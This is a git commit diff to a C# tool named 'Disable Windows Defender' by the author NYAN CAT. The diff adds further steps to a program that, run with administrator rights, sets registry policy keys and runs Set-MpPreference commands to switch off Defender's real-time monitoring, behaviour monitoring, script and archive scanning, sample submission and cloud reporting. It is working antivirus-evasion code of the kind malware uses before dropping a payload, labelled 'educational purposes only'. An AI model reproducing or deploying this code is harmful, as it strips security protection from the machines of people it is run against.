b3e1c0602ef6c688506516114a32121c80992ff2
NYAN CAT <NYANxCAT@pm.me>
2019-04-23 03:27:16 -0700

    Update Program.cs

--- Disable-Windows-Defender/Program.cs
+++ Disable-Windows-Defender/Program.cs
@@ -5,7 +5,7 @@ using System.Security.Principal;
 using System.Threading;
 
 //       │ Author     : NYAN CAT
-//       │ Name       : Disable Windows Defender v0.3
+//       │ Name       : Disable Windows Defender v0.3.5
 //       │ Contact    : https://github.com/NYAN-x-CAT
 
 //       This program is distributed for educational purposes only. 
@@ -19,18 +19,26 @@ namespace Disable_Windows_Defender
 
             if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator)) return;
 
-            RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiSpyware");
-            RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableBehaviorMonitoring");
-            RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableOnAccessProtection");
-            RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableScanOnRealtimeEnable");
+            RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiSpyware", "1");
+            RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableBehaviorMonitoring","1");
+            RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableOnAccessProtection", "1");
+            RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableScanOnRealtimeEnable", "1");
 
             Thread.Sleep(100);
 
             RunPS("Set-MpPreference -DisableRealtimeMonitoring $true");
             RunPS("Set-MpPreference -DisableBehaviorMonitoring $true");
+            RunPS("Set-MpPreference -DisableBlockAtFirstSeen $true");
+            RunPS("Set-MpPreference -DisableIOAVProtection $true");
+            RunPS("Set-MpPreference -DisablePrivacyMode $true");
+            RunPS("Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true");
+            RunPS("Set-MpPreference -DisableArchiveScanning $true");
+            RunPS("Set-MpPreference -DisableScriptScanning $true");
+            RunPS("Set-MpPreference -SubmitSamplesConsent 0");
+            RunPS("Set-MpPreference -MAPSReporting 0");
         }
 
-        private static void RegistryEdit(string regPath, string name)
+        private static void RegistryEdit(string regPath, string name, string value)
         {
             try
             {
@@ -38,11 +46,11 @@ namespace Disable_Windows_Defender
                 {
                     if (key == null)
                     {
-                        Registry.LocalMachine.CreateSubKey(regPath).SetValue(name, "00000001", RegistryValueKind.DWord);
+                        Registry.LocalMachine.CreateSubKey(regPath).SetValue(name, value, RegistryValueKind.DWord);
                         return;
                     }
-                    if (key.GetValue(name) != (object)"00000001")
-                        key.SetValue(name, "00000001",RegistryValueKind.DWord);
+                    if (key.GetValue(name) != (object)value)
+                        key.SetValue(name, value, RegistryValueKind.DWord);
                 }
             }
             catch { }
